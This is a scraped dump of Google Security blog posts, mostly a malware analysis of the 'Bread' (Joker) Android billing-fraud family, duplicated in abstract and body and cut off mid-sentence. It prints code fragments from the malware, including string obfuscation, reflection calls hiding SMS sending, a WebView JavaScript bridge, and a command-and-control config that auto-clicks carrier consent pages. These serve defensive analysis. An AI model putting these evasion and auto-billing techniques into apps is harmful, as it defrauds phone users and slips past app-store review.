entire web. In 2020, we are building on this commitment by launching a new iteration of our Patch Rewards program for third-party open source projects.  Over the last six years, we have rewarded open source projects for security improvements after they have been implemented. While this has led to overall improved security, we want to take this one step further.  Introducing upfront financial help Starting on January 1, 2020, we’re not only going to reward proactive security improvements after the work is completed, but we will also complement the program with upfront financial support to provide an additional resource for open source developers to prioritize security work. For example, if you are a small open source project and you want to improve security, but don’t have the necessary resources, this new reward can help you acquire additional development capacity.     We will start off with two support levels :   Small ($5,000): Meant to motivate and reward a project for fixing a small number of security issues. Examples: improvements to privilege separation or sandboxing, cleanup of integer artimetrics, or more generally fixing vulnerabilities identified in open source software by bug bounty programs such as EU-FOSSA 2 (see ‘Qualifying submissions’ here for more examples). Large ($30,000): Meant to incentivize a larger project to invest heavily in security, e.g. providing support to find additional developers, or implement a significant new security feature (e.g. new compiler mitigations).  Nomination process  Anyone can nominate an open source project for support by filling out http://goo.gle/patchz-nomination. Our Patch Reward Panel will review submissions on a monthly basis and select a number of projects that meet the program criteria. The panel will let submitors know if a project has been chosen and will start working with the project maintainers directly.  Projects in scope   Any open source project can be nominated for support. When selecting projects, the panel will put an emphasis on projects that either are vital to the health of the Internet or are end-user projects with a large user base.  What do we expect in return?  We expect to see security improvements to open source software. Ideally, the project can provide uswith a short blurb or pointers to some of the completed work that was possible because of our support. We don’t want to add bureaucracy, but would like to measure the success of the program.What about the existing Patch Rewards program? This is an addition to the existing program, the current Patch Rewards program will continue as it stands today.       ", "date": "December 18, 2019"},
{"website": "Google-Security", "title": "\nPHA Family Highlights: Bread (and Friends)\n", "author": ["Posted by Alec Guertin and Vadim Kotov, Android Security & Privacy Team \n", "\nIn this edition of our ", " series we introduce Bread, a large-scale billing fraud family. We first started tracking Bread (also known as Joker) in early 2017, identifying apps designed solely for ", ". As the Play Store has introduced new policies and Google Play Protect has scaled defenses, Bread apps were forced to continually iterate to search for gaps. They have at some point used just about every cloaking and obfuscation technique under the sun in an attempt to go undetected. Many of these samples appear to be designed specifically to attempt to slip into the Play Store undetected and are not seen elsewhere. In this post, we show how Google Play Protect has defended against a well organized, persistent attacker and share examples of their techniques.\n", "\n\n", "\nTL;DR", "\n", "\n", "\n", "\n", "\n", "\n", "\nBILLING FRAUD", "\nBread apps typically fall into two categories: SMS fraud (older versions) and toll fraud (newer versions). Both of these types of fraud take advantage of mobile billing techniques involving the user’s carrier.\n", "\n\n", "\nCarriers may partner with vendors to allow users to pay for services by SMS. The user simply needs to text a prescribed keyword to a prescribed number (shortcode). A charge is then added to the user’s bill with their mobile service provider.\n", "\n\n", "\n", "\nCarriers may also provide payment endpoints over a web page. The user visits the URL to complete the payment and enters their phone number. Verification that the request is coming from the user’s device is completed using two possible methods:\n", "\n\n", "\n", "\nBoth of the billing methods detailed above provide device verification, but not user verification. The carrier can determine that the request originates from the user’s device, but does not require any interaction from the user that cannot be automated. Malware authors use injected clicks, custom HTML parsers and SMS receivers to automate the billing process without requiring any interaction from the user.\n", "\n\n", "\nBread apps have used many innovative and classic techniques to hide strings from analysis engines. Here are some highlights.\n", "\n\n", "\nFrequently, Bread apps take advantage of standard crypto libraries in `java.util.crypto`. We have discovered apps using AES, Blowfish, and DES as well as combinations of these to encrypt their strings.\n", "\n\n", "\nOther variants have used custom-implemented encryption algorithms. Some common techniques include: basic XOR encryption, nested XOR and custom key-derivation methods. Some variants have gone so far as to use a different key for the strings of each class.\n", "\n\n", "\nEncrypted strings can be a signal that the code is trying to hide something. Bread has used a few tricks to keep strings in plaintext while preventing basic string matching.\n", "\n\n\n\n\n", "\nGoing one step further, these substrings are sometimes scattered throughout the code, retrieved from static variables and method calls. Various versions may also change the index of the split (e.g. “.clic” and “k();”).\n", "\n\n", "\nAnother technique to obfuscate unencrypted strings uses repeated delimiters. A short, constant string of characters is inserted at strategic points to break up keywords:\n", "\n\n\n\n\n", "\nAt runtime, the delimiter is removed before using the string:\n", "\n\n\n\n\n", "\n", "\nSMS and toll fraud generally requires a few basic behaviors (for example, disabling WiFi or accessing SMS), which are accessible by a handful of APIs. Given that there are a limited number of behaviors required to identify billing fraud, Bread apps have had to try a wide variety of techniques to mask usage of these APIs.\n", "\n\n", "\nMost methods for hiding API usage tend to use Java reflection in some way. In some samples, Bread has simply directly called the Reflect API on strings decrypted at runtime.\n", "\n\n\n\n\n", "\n", "\nBread has also tested our ability to analyze native code. In one sample, no SMS-related code appears in the DEX file, but there is a native method registered.\n", "\n\n\n\n\n", "\nTwo strings are passed into the call, the shortcode and keyword used for SMS billing (getter methods renamed here for clarity).\n", "\n\n\n\n\n", "\nIn the native library, it stores the strings to access the SMS API.\n", "\n", "\nThe ", " method uses the Java Native Interface (JNI) to fetch and call the Android SMS API. The following is a screenshot from IDA with comments showing the strings and JNI functions.\n", "\n\n", "\n", "\nContinuing on the theme of cross-language bridges, Bread has also tried out some obfuscation methods utilizing JavaScript in WebViews. The following method is declared in the DEX.\n", "\n\n\n\n\n", "\nWithout context, this method does not reveal much about its intended behavior, and there are no calls made to it anywhere in the DEX. However, the app does create a WebView and registers a JavaScript interface to this class.\n", "\n\n\n\n\n", "\nThis gives JavaScript run in the WebView access to this method. The app loads a URL pointing to a Bread-controlled server. The response contains some basic HTML and JavaScript.\n", "\n", "\nIn green, we can see the references to the SMS API. In red, we see those values being passed into the suspicious Java method through the registered interface. Now, using these strings ", " can use reflection to call ", " and process the payment.\n", "\n\n", "\nIn addition to implementing custom obfuscation techniques, apps have used several commercially available packers including: Qihoo360, AliProtect and SecShell.\n", "\n\nMore recently, we have seen Bread-related apps trying to hide malicious code in a native library shipped with the APK. Earlier this year, we discovered apps hiding a JAR in the data section of an ELF file which it then dynamically loads using ", ".\n", "\n\nThe figure below shows a fragment of encrypted JAR stored in .rodata section of a shared object shipped with the APK as well as the XOR key used for decryption.\n", "\n\n", "\nAfter we blocked those samples, they moved a significant portion of malicious functionality into the native library, which resulted in a rather peculiar back and forth between Dalvik and native code:\n", "\n\n", "\n", "\n", "\nEarly versions of Bread utilized a basic command and control infrastructure to dynamically deliver content and retrieve billing details. In the example server response below, the green fields show text to be shown to the user. The red fields are used as the shortcode and keyword for SMS billing.\n", "\n\n", "\n", "\nSince various carriers implement the billing process differently, Bread has developed several variants containing generalized state machines implementing all possible steps. At runtime, the apps can check which carrier the device is connected to and fetch a configuration object from the command and control server. The configuration contains a list of steps to execute with URLs and JavaScript.\n", "\n\n\n\n\n", "\nThe steps implemented include:\n", "\n\n", "\n", "\nOne of the more interesting states implements the ability to solve basic captchas (obscured letters and numbers). First, the app creates a JavaScript function to call a Java method, ", ", exposed to WebView using ", ".\n", "\n\n", "\nThe value used to replace ", " comes from the JSON configuration.\n", "\n\n\n\n\n", "\nThe app then uses JavaScript injection to create a new script in the carrier’s web page to run the new function.\n", "\n\n", "\nThe base64-encoded image is then uploaded to an image recognition service. If the text is retrieved successfully, the app uses JavaScript injection again to submit the HTML form with the captcha answer.\n", "\n\n", "\n", "\nIn our basic command & control example above, we didn’t address the (incorrectly labeled) “imei” field.\n", "\n\n\n\n\n", "\nThis contains the Mobile Country Code (MCC) and Mobile Network Code (MNC) values that the billing process will work for. In this example, the server response contains several values for Thai carriers. The app checks if the device’s network matches one of those provided by the server. If it does, it will commence with the billing process. If the value does not match, the app skips the “disclosure” page and billing process and brings the user straight to the app content.\n", "\n\nIn some versions, the server would only return valid responses several days after the apps were submitted.\n", "\n\n", "\nIn the JavaScript bridge API obfuscation example covered above, the server supplied the app with the necessary strings to complete the billing process. However, analysts may not always see the indicators of compromise in the server’s response.\n", "\n\nIn this example, the requests to the server take the following form:\n", "\n\n\n\n\n", "\nHere, the “operator” query parameter is the Mobile Country Code and Mobile Network Code . The server can use this information to determine if the user’s carrier is one of Bread’s targets. If not, the response is scrubbed of the strings used to complete the billing fraud.\n", "\n\n\n\n\n", "\n", "\nBread apps sometimes display a pop-up to the user that implies some form of compliance or disclosure, showing ", " or a ", " button. However, the actual text would often only display a basic welcome message.\n", "\n\n", "\n", "\n", "\n\nOther versions included all the pieces needed for a valid disclosure message.\n", "\n\n", "\nWhen translated the disclosure reads:\n", "\n\n", "\n", "\n\nHowever, there are still two issues here:\n", "\n\n", "\nEven if the disclosure here displayed accurate information, the user would often find that the advertised functionality of the app did not match the actual content. Bread apps frequently contain no functionality beyond the billing process or simply clone content from other popular apps.\n", "\n\n", "\nBread has also leveraged an abuse tactic unique to app stores: versioning. Some apps have started with clean versions, in an attempt to grow user bases and build the developer accounts’ reputations. Only later is the malicious code introduced, through an update. Interestingly, early “clean” versions contain varying levels of signals that the updates will include malicious code later. Some are first uploaded with all the necessary code except the one line that actually initializes the billing process. Others may have the necessary permissions, but are missing the classes containing the fraud code. And others have all malicious content removed, except for log comments referencing the payment process. All of these methods attempt to space out the introduction of possible signals in various stages, testing for gaps in the publication process. However, GPP does not treat new apps and updates any differently from an analysis perspective.\n", "\n\n", "\nWhen early versions of apps are first published, many five star reviews appear with comments like:\n", "\n", "\n\n"], "link": "https://security.googleblog.com/2020/01/pha-family-highlights-bread-and-friends.html", "abstract": "                             Posted by Alec Guertin and Vadim Kotov, Android Security &amp; Privacy Team                In this edition of our  PHA Family Highlights  series we introduce Bread, a large-scale billing fraud family. We first started tracking Bread (also known as Joker) in early 2017, identifying apps designed solely for  SMS fraud . As the Play Store has introduced new policies and Google Play Protect has scaled defenses, Bread apps were forced to continually iterate to search for gaps. They have at some point used just about every cloaking and obfuscation technique under the sun in an attempt to go undetected. Many of these samples appear to be designed specifically to attempt to slip into the Play Store undetected and are not seen elsewhere. In this post, we show how Google Play Protect has defended against a well organized, persistent attacker and share examples of their techniques.           TL;DR             Google Play Protect detected and removed 1.7k unique Bread apps from the Play Store before ever being downloaded by users     Bread apps originally performed SMS fraud, but have largely abandoned this for WAP billing following the introduction of  new Play policies  restricting use of the SEND_SMS permission and increased coverage by Google Play Protect     More information on stats and relative impact is available in the  Android Security 2018 Year in Review report               BILLING FRAUD     Bread apps typically fall into two categories: SMS fraud (older versions) and toll fraud (newer versions). Both of these types of fraud take advantage of mobile billing techniques involving the user&#8217;s carrier.      SMS Billing  Carriers may partner with vendors to allow users to pay for services by SMS. The user simply needs to text a prescribed keyword to a prescribed number (shortcode). A charge is then added to the user&#8217;s bill with their mobile service provider.             Toll Billing  Carriers may also provide payment endpoints over a web page. The user visits the URL to complete the payment and enters their phone number. Verification that the request is coming from the user&#8217;s device is completed using two possible methods:       The user connects to the site over mobile data, not WiFi (so the service provider directly handles the connection and can validate the phone number); or     The user must retrieve a code sent to them via SMS and enter it into the web page (thereby proving access to the provided phone number).       Fraud  Both of the billing methods detailed above provide device verification, but not user verification. The carrier can determine that the request originates from the user&#8217;s device, but does not require any interaction from the user that cannot be automated. Malware authors use injected clicks, custom HTML parsers and SMS receivers to automate the billing process without requiring any interaction from the user.      STRING &amp; DATA OBFUSCATION  Bread apps have used many innovative and classic techniques to hide strings from analysis engines. Here are some highlights.      Standard Encryption  Frequently, Bread apps take advantage of standard crypto libraries in `java.util.crypto`. We have discovered apps using AES, Blowfish, and DES as well as combinations of these to encrypt their strings.      Custom Encryption  Other variants have used custom-implemented encryption algorithms. Some common techniques include: basic XOR encryption, nested XOR and custom key-derivation methods. Some variants have gone so far as to use a different key for the strings of each class.      Split Strings  Encrypted strings can be a signal that the code is trying to hide something. Bread has used a few tricks to keep strings in plaintext while preventing basic string matching.        String click_code = new StringBuilder().append(\".cli\").append(\"ck();\");   Going one step further, these substrings are sometimes scattered throughout the code, retrieved from static variables and method calls. Various versions may also change the index of the split (e.g. &#8220;.clic&#8221; and &#8220;k();&#8221;).      Delimiters  Another technique to obfuscate unencrypted strings uses repeated delimiters. A short, constant string of characters is inserted at strategic points to break up keywords:        String js = \"javm6voTascrm6voTipt:window.SDFGHWEGSG.catcm6voThPage(docm6voTument.getElemm6voTentsByTm6voTagName('html')[m6voT0].innerHTML);\"   At runtime, the delimiter is removed before using the string:        js = js.replaceAll(\"m6voT\", \"\");     API OBFUSCATION  SMS and toll fraud generally requires a few basic behaviors (for example, disabling WiFi or accessing SMS), which are accessible by a handful of APIs. Given that there are a limited number of behaviors required to identify billing fraud, Bread apps have had to try a wide variety of techniques to mask usage of these APIs.      Reflection  Most methods for hiding API usage tend to use Java reflection in some way. In some samples, Bread has simply directly called the Reflect API on strings decrypted at runtime.        Class smsManagerClass = Class.forName(p.a().decrypt(\"wI7HmhUo0OYTnO2rFy3yxE2DFECD2I9reFnmPF3LuAc=\"));  // android.telephony.SmsManager smsManagerClass.getMethod(p.a().decrypt(\"0oXNjC4kzLwqnPK9BiL4qw==\"),  // sendTextMessage                              String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(smsManagerClass.getMethod(p.a().decrypt(\"xoXXrB8n1b0LjYfIYUObrA==\")).invoke(null), addr, null, message, null, null);  // getDefault     JNI  Bread has also tested our ability to analyze native code. In one sample, no SMS-related code appears in the DEX file, but there is a native method registered.         public static native void nativesend(String arg0, String arg1);   Two strings are passed into the call, the shortcode and keyword used for SMS billing (getter methods renamed here for clarity).            JniManager.nativesend(this.get_shortcode(), this.get_keyword());   In the native library, it stores the strings to access the SMS API.          The  nativesend  method uses the Java Native Interface (JNI) to fetch and call the Android SMS API. The following is a screenshot from IDA with comments showing the strings and JNI functions.             WebView JavaScript Interface  Continuing on the theme of cross-language bridges, Bread has also tried out some obfuscation methods utilizing JavaScript in WebViews. The following method is declared in the DEX.            public void method1(String p7, String p8, String p9, String p10, String p11) {              Class v0_1 = Class.forName(p7);             Class[] v1_1 = new Class[0];             Object[] v3_1 = new Object[0];             Object v1_3 = v0_1.getMethod(p8, v1_1).invoke(0, v3_1);             Class[] v2_2 = new Class[5];             v2_2[0] = String.class;             v2_2[1] = String.class;             v2_2[2] = String.class;             v2_2[3] = android.app.PendingIntent.class;             v2_2[4] = android.app.PendingIntent.class;             reflect.Method v0_2 = v0_1.getMethod(p9, v2_2);             Object[] v2_4 = new Object[5];             v2_4[0] = p10;             v2_4[1] = 0;             v2_4[2] = p11;             v2_4[3] = 0;             v2_4[4] = 0;             v0_2.invoke(v1_3, v2_4);     }   Without context, this method does not reveal much about its intended behavior, and there are no calls made to it anywhere in the DEX. However, the app does create a WebView and registers a JavaScript interface to this class.        this.webView.addJavascriptInterface(this, \"stub\");   This gives JavaScript run in the WebView access to this method. The app loads a URL pointing to a Bread-controlled server. The response contains some basic HTML and JavaScript.          In green, we can see the references to the SMS API. In red, we see those values being passed into the suspicious Java method through the registered interface. Now, using these strings  method1  can use reflection to call  sendTextMessage  and process the payment.      PACKING  In addition to implementing custom obfuscation techniques, apps have used several commercially available packers including: Qihoo360, AliProtect and SecShell.    More recently, we have seen Bread-related apps trying to hide malicious code in a native library shipped with the APK. Earlier this year, we discovered apps hiding a JAR in the data section of an ELF file which it then dynamically loads using  DexClassLoader .    The figure below shows a fragment of encrypted JAR stored in .rodata section of a shared object shipped with the APK as well as the XOR key used for decryption.           After we blocked those samples, they moved a significant portion of malicious functionality into the native library, which resulted in a rather peculiar back and forth between Dalvik and native code:             COMMAND &amp; CONTROL    Dynamic Shortcodes &amp; Content  Early versions of Bread utilized a basic command and control infrastructure to dynamically deliver content and retrieve billing details. In the example server response below, the green fields show text to be shown to the user. The red fields are used as the shortcode and keyword for SMS billing.             State Machines  Since various carriers implement the billing process differently, Bread has developed several variants containing generalized state machines implementing all possible steps. At runtime, the apps can check which carrier the device is connected to and fetch a configuration object from the command and control server. The configuration contains a list of steps to execute with URLs and JavaScript.        {    \"message\":\"Success\",    \"result\":[       {          \"list\":[             {                \"endUrl\":\"http://sabai5555.com/\",                \"netType\":0,                \"number\":1,                \"offerId\":\"1009\",                \"step\":1,                \"trankUrl\": \"http://atracking-auto.appflood.com/transaction/post_click?offer_id=19190660&amp;aff_id=10336\"             },             {                \"netType\":0,                \"number\":2,                \"offerId\":\"1009\",                \"params\":\"function jsFun(){document.getElementsByTagName('a')[1].click()};\",                \"step\":2             },             {                \"endUrl\":\"http://consentprt.dtac.co.th/webaoc/InformationPage\",                \"netType\":0,                \"number\":3,                \"offerId\":\"1009\",                \"params\":\"javascript:jsFun()\",                \"step\":4             },             {                \"endUrl\":\"http://consentprt.dtac.co.th/webaoc/SuccessPage\",                \"netType\":0,                \"number\":4,                \"offerId\":\"1009\",                \"params\":\"javascript:getOk()\",                \"step\":3             },             {                \"netType\":0,                \"number\":5,                \"offerId\":\"1009\",                \"step\":7             }          ],          \"netType\":0,          \"offerId\":\"1009\"       }    ],    \"code\":\"200\" }   The steps implemented include:       Load a URL in a WebView     Run JavaScript in WebView     Toggle WiFi state     Toggle mobile data state     Read/modify SMS inbox     Solve captchas       Captchas  One of the more interesting states implements the ability to solve basic captchas (obscured letters and numbers). First, the app creates a JavaScript function to call a Java method,  getImageBase64 , exposed to WebView using  addJavascriptInterface .           The value used to replace  GET_IMG_OBJECT  comes from the JSON configuration.        \"params\": \"document.getElementById('captcha')\"   The app then uses JavaScript injection to create a new script in the carrier&#8217;s web page to run the new function.           The base64-encoded image is then uploaded to an image recognition service. If the text is retrieved successfully, the app uses JavaScript injection again to submit the HTML form with the captcha answer.      CLOAKING    Client-side Carrier Checks  In our basic command &amp; control example above, we didn&#8217;t address the (incorrectly labeled) &#8220;imei&#8221; field.        {  \"button\": \"ย&#3636;นด&#3637;ต&#3657;อนร&#3633;บ\",  \"code\": 0,  \"content\": \"F10\",  \"imei\": \"52003,52005,52000\",  \"rule\": \"Here are all the pictures you need, about                          happiness, beauty, beauty, etc., with our most                       sincere service, to provide you with the most                complete resources.\",  \"service\": \"4219245\" }   This contains the Mobile Country Code (MCC) and Mobile Network Code (MNC) values that the billing process will work for. In this example, the server response contains several values for Thai carriers. The app checks if the device&#8217;s network matches one of those provided by the server. If it does, it will commence with the billing process. If the value does not match, the app skips the &#8220;disclosure&#8221; page and billing process and brings the user straight to the app content.    In some versions, the server would only return valid responses several days after the apps were submitted.      Server-side Carrier Checks  In the JavaScript bridge API obfuscation example covered above, the server supplied the app with the necessary strings to complete the billing process. However, analysts may not always see the indicators of compromise in the server&#8217;s response.    In this example, the requests to the server take the following form:        http://X.X.X.X/web?operator=52000&amp;id=com.battery.fakepackage&amp;deviceid=deadbeefdeadbeefdeadbeefdeadbeef   Here, the &#8220;operator&#8221; query parameter is the Mobile Country Code and Mobile Network Code . The server can use this information to determine if the user&#8217;s carrier is one of Bread&#8217;s targets. If not, the response is scrubbed of the strings used to complete the billing fraud.        &lt;a onclick=\"Sub()\"&gt;ไปเด&#3637;&#3659;ยวน&#3637;&#3657;&lt;/a&gt; &lt;div style=\"display:none\"&gt;     &lt;p id=\"deviceid\"&gt;deadbeefdeadbeefdeadbeefdeadbeef&lt;/p&gt;     &lt;p id=\"cmobi\"&gt;&lt;/p&gt;     &lt;p id=\"deni\"&gt;&lt;/p&gt;     &lt;p id=\"ssm\"&gt;&lt;/p&gt;     &lt;p id=\"shortcode\"&gt;&lt;/p&gt;     &lt;p id=\"keyword\"&gt;&lt;/p&gt; &lt;/div&gt;     MISLEADING USERS  Bread apps sometimes display a pop-up to the user that implies some form of compliance or disclosure, showing  terms and conditions  or a  confirm  button. However, the actual text would often only display a basic welcome message.            Translation: &#8220;This app is a place to be and it will feel like a superhero with this new app. We hope you enjoy it!&#8221;     Other versions included all the pieces needed for a valid disclosure message.           When translated the disclosure reads:     &#8220;Apply Car Racing Clip \\n Please enter your phone number for service details. \\n Terms and Conditions \\nFrom 9 Baht / day, you will receive 1 message / day. \\nPlease stop the V4 printing service at 4739504 \\n or call 02-697-9298 \\n Monday - Friday at 8.30 - 5.30pm \\n&#8221;     However, there are still two issues here:       The numbers to contact for cancelling the subscription are not real     The billing process commences even if you don&#8217;t hit the &#8220;Confirm&#8221; button     Even if the disclosure here displayed accurate information, the user would often find that the advertised functionality of the app did not match the actual content. Bread apps frequently contain no functionality beyond the billing process or simply clone content from other popular apps.      VERSIONING  Bread has also leveraged an abuse tactic unique to app stores: versioning. Some apps have started with clean versions, in an attempt to grow user bases and build the developer accounts&#8217; reputations. Only later is the malicious code introduced, through an update. Interestingly, early &#8220;clean&#8221; versions contain varying levels of signals that the updates will include malicious code later. Some are first uploaded with all the necessary code except the one line that actually initializes the billing process. Others may have the necessary permissions, but are missing the classes containing the fraud code. And others have all malicious content removed, except for log comments referencing the payment process. All of these methods attempt to space out the introduction of possible signals in various stages, testing for gaps in the publication process. However, GPP does not treat new apps and updates any differently from an analysis perspective.      FAKE REVIEWS  When early versions of apps are first published, many five star reviews appear with comments like:                      &#8220;So..good..&#8221;     &#8220;very beautiful&#8221;    Later, 1 star reviews from  real  users start appearing with comments like:    &#8220;Deception&#8221;     &#8220;The app is not honest &#8230;&#8221;      SUMMARY  Sheer volume appears to be the preferred approach for Bread developers. At different times, we have seen three or more active variants using different approaches or targeting different carriers. Within each variant, the malicious code present in each sample may look nearly identical with only one evasion technique changed. Sample 1 may use AES-encrypted strings with reflection, while Sample 2 (submitted on the same day) will use the same code but with plaintext strings.   At peak times of activity, we have seen up to 23 different apps from this family submitted to Play in one day. At other times, Bread appears to abandon hope of making a variant successful and we see a gap of a week or longer before the next variant. This family showcases the amount of resources that malware authors now have to expend. Google Play Protect is constantly updating detection engines and warning users of malicious apps installed on their device.     SELECTED SAMPLES               Package Name            SHA-256 Digest                 com.rabbit.artcamera          18c277c7953983f45f2fe6ab4c7d872b2794c256604e43500045cb2b2084103f                org.horoscope.astrology.predict          6f1a1dbeb5b28c80ddc51b77a83c7a27b045309c4f1bff48aaff7d79dfd4eb26                com.theforest.rotatemarswallpaper          4e78a26832a0d471922eb61231bc498463337fed8874db5f70b17dd06dcb9f09                com.jspany.temp          0ce78efa764ce1e7fb92c4de351ec1113f3e2ca4b2932feef46d7d62d6ae87f5                com.hua.ru.quan          780936deb27be5dceea20a5489014236796a74cc967a12e36cb56d9b8df9bc86                com.rongnea.udonood          8b2271938c524dd1064e74717b82e48b778e49e26b5ac2dae8856555b5489131                com.mbv.a.wp          01611e16f573da2c9dbc7acdd445d84bae71fecf2927753e341d8a5652b89a68                com.pho.nec.sg          b4822eeb71c83e4aab5ddfecfb58459e5c5e10d382a2364da1c42621f58e119b                                                Posted by Alec Guertin and Vadim Kotov, Android Security & Privacy Team      In this edition of our PHA Family Highlights series we introduce Bread, a large-scale billing fraud family. We first started tracking Bread (also known as Joker) in early 2017, identifying apps designed solely for SMS fraud. As the Play Store has introduced new policies and Google Play Protect has scaled defenses, Bread apps were forced to continually iterate to search for gaps. They have at some point used just about every cloaking and obfuscation technique under the sun in an attempt to go undetected. Many of these samples appear to be designed specifically to attempt to slip into the Play Store undetected and are not seen elsewhere. In this post, we show how Google Play Protect has defended against a well organized, persistent attacker and share examples of their techniques.      TL;DR     Google Play Protect detected and removed 1.7k unique Bread apps from the Play Store before ever being downloaded by users   Bread apps originally performed SMS fraud, but have largely abandoned this for WAP billing following the introduction of new Play policies restricting use of the SEND_SMS permission and increased coverage by Google Play Protect   More information on stats and relative impact is available in the Android Security 2018 Year in Review report       BILLING FRAUD  Bread apps typically fall into two categories: SMS fraud (older versions) and toll fraud (newer versions). Both of these types of fraud take advantage of mobile billing techniques involving the user’s carrier.    SMS Billing Carriers may partner with vendors to allow users to pay for services by SMS. The user simply needs to text a prescribed keyword to a prescribed number (shortcode). A charge is then added to the user’s bill with their mobile service provider.      Toll Billing Carriers may also provide payment endpoints over a web page. The user visits the URL to complete the payment and enters their phone number. Verification that the request is coming from the user’s device is completed using two possible methods:    The user connects to the site over mobile data, not WiFi (so the service provider directly handles the connection and can validate the phone number); or   The user must retrieve a code sent to them via SMS and enter it into the web page (thereby proving access to the provided phone number).    Fraud Both of the billing methods detailed above provide device verification, but not user verification. The carrier can determine that the request originates from the user’s device, but does not require any interaction from the user that cannot be automated. Malware authors use injected clicks, custom HTML parsers and SMS receivers to automate the billing process without requiring any interaction from the user.    STRING & DATA OBFUSCATION Bread apps have used many innovative and classic techniques to hide strings from analysis engines. Here are some highlights.    Standard Encryption Frequently, Bread apps take advantage of standard crypto libraries in `java.util.crypto`. We have discovered apps using AES, Blowfish, and DES as well as combinations of these to encrypt their strings.    Custom Encryption Other variants have used custom-implemented encryption algorithms. Some common techniques include: basic XOR encryption, nested XOR and custom key-derivation methods. Some variants have gone so far as to use a different key for the strings of each class.    Split Strings Encrypted strings can be a signal that the code is trying to hide something. Bread has used a few tricks to keep strings in plaintext while preventing basic string matching.      String click_code = new StringBuilder().append(\".cli\").append(\"ck();\");  Going one step further, these substrings are sometimes scattered throughout the code, retrieved from static variables and method calls. Various versions may also change the index of the split (e.g. “.clic” and “k();”).    Delimiters Another technique to obfuscate unencrypted strings uses repeated delimiters. A short, constant string of characters is inserted at strategic points to break up keywords:      String js = \"javm6voTascrm6voTipt:window.SDFGHWEGSG.catcm6voThPage(docm6voTument.getElemm6voTentsByTm6voTagName('html')[m6voT0].innerHTML);\"  At runtime, the delimiter is removed before using the string:      js = js.replaceAll(\"m6voT\", \"\");   API OBFUSCATION SMS and toll fraud generally requires a few basic behaviors (for example, disabling WiFi or accessing SMS), which are accessible by a handful of APIs. Given that there are a limited number of behaviors required to identify billing fraud, Bread apps have had to try a wide variety of techniques to mask usage of these APIs.    Reflection Most methods for hiding API usage tend to use Java reflection in some way. In some samples, Bread has simply directly called the Reflect API on strings decrypted at runtime.      Class smsManagerClass = Class.forName(p.a().decrypt(\"wI7HmhUo0OYTnO2rFy3yxE2DFECD2I9reFnmPF3LuAc=\"));  // android.telephony.SmsManager smsManagerClass.getMethod(p.a().decrypt(\"0oXNjC4kzLwqnPK9BiL4qw==\"),  // sendTextMessage                              String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(smsManagerClass.getMethod(p.a().decrypt(\"xoXXrB8n1b0LjYfIYUObrA==\")).invoke(null), addr, null, message, null, null);  // getDefault   JNI Bread has also tested our ability to analyze native code. In one sample, no SMS-related code appears in the DEX file, but there is a native method registered.       public static native void nativesend(String arg0, String arg1);  Two strings are passed into the call, the shortcode and keyword used for SMS billing (getter methods renamed here for clarity).          JniManager.nativesend(this.get_shortcode(), this.get_keyword());  In the native library, it stores the strings to access the SMS API.    The nativesend method uses the Java Native Interface (JNI) to fetch and call the Android SMS API. The following is a screenshot from IDA with comments showing the strings and JNI functions.      WebView JavaScript Interface Continuing on the theme of cross-language bridges, Bread has also tried out some obfuscation methods utilizing JavaScript in WebViews. The following method is declared in the DEX.          public void method1(String p7, String p8, String p9, String p10, String p11) {              Class v0_1 = Class.forName(p7);             Class[] v1_1 = new Class[0];             Object[] v3_1 = new Object[0];             Object v1_3 = v0_1.getMethod(p8, v1_1).invoke(0, v3_1);             Class[] v2_2 = new Class[5];             v2_2[0] = String.class;             v2_2[1] = String.class;             v2_2[2] = String.class;             v2_2[3] = android.app.PendingIntent.class;             v2_2[4] = android.app.PendingIntent.class;             reflect.Method v0_2 = v0_1.getMethod(p9, v2_2);             Object[] v2_4 = new Object[5];             v2_4[0] = p10;             v2_4[1] = 0;             v2_4[2] = p11;             v2_4[3] = 0;             v2_4[4] = 0;             v0_2.invoke(v1_3, v2_4);     }  Without context, this method does not reveal much about its intended behavior, and there are no calls made to it anywhere in the DEX. However, the app does create a WebView and registers a JavaScript interface to this class.      this.webView.addJavascriptInterface(this, \"stub\");  This gives JavaScript run in the WebView access to this method. The app loads a URL pointing to a Bread-controlled server. The response contains some basic HTML and JavaScript.    In green, we can see the references to the SMS API. In red, we see those values being passed into the suspicious Java method through the registered interface. Now, using these strings method1 can use reflection to call sendTextMessage and process the payment.    PACKING In addition to implementing custom obfuscation techniques, apps have used several commercially available packers including: Qihoo360, AliProtect and SecShell.   More recently, we have seen Bread-related apps trying to hide malicious code in a native library shipped with the APK. Earlier this year, we discovered apps hiding a JAR in the data section of an ELF file which it then dynamically loads using DexClassLoader.   The figure below shows a fragment of encrypted JAR stored in .rodata section of a shared object shipped with the APK as well as the XOR key used for decryption.     After we blocked those samples, they moved a significant portion of malicious functionality into the native library, which resulted in a rather peculiar back and forth between Dalvik and native code:      COMMAND & CONTROL  Dynamic Shortcodes & Content Early versions of Bread utilized a basic command and control infrastructure to dynamically deliver content and retrieve billing details. In the example server response below, the green fields show text to be shown to the user. The red fields are used as the shortcode and keyword for SMS billing.      State Machines Since various carriers implement the billing process differently, Bread has developed several variants containing generalized state machines implementing all possible steps. At runtime, the apps can check which carrier the device is connected to and fetch a configuration object from the command and control server. The configuration contains a list of steps to execute with URLs and JavaScript.      {    \"message\":\"Success\",    \"result\":[       {          \"list\":[             {                \"endUrl\":\"http://sabai5555.com/\",                \"netType\":0,                \"number\":1,                \"offerId\":\"1009\",                \"step\":1,                \"trankUrl\": \"http://atracking-auto.appflood.com/transaction/post_click?offer_id=19190660&aff_id=10336\"             },             {                \"netType\":0,                \"number\":2,                \"offerId\":\"1009\",                \"params\":\"function jsFun(){document.getElementsByTagName('a')[1].click()};\",                \"step\":2             },             {                \"endUrl\":\"http://consentprt.dtac.co.th/webaoc/InformationPage\",                \"netType\":0,                \"number\":3,                \"offerId\":\"1009\",                \"params\":\"javascript:jsFun()\",                \"step\":4             },             {                \"endUrl\":\"http://consentprt.dtac.co.th/webaoc/SuccessPage\",                \"netType\":0,                \"number\":4,                \"offerId\":\"1009\",                \"params\":\"javascript:getOk()\",                \"step\":3             },             {                \"netType\":0,                \"number\":5,                \"offerId\":\"1009\",                \"step\":7             }          ],          \"netType\":0,          \"offerId\":\"1009\"       }    ],    \"code\":\"200\" }  The steps implemented include:    Load a URL in a WebView   Run JavaScript in WebView   Toggle WiFi state   Toggle mobile data state   Read/modify SMS inbox   Solve captchas    Captchas One of the more interesting states implements the ability to solve basic captchas (obscured letters and numbers). First, the app creates a JavaScript function to call a Java method, getImageBase64, exposed to 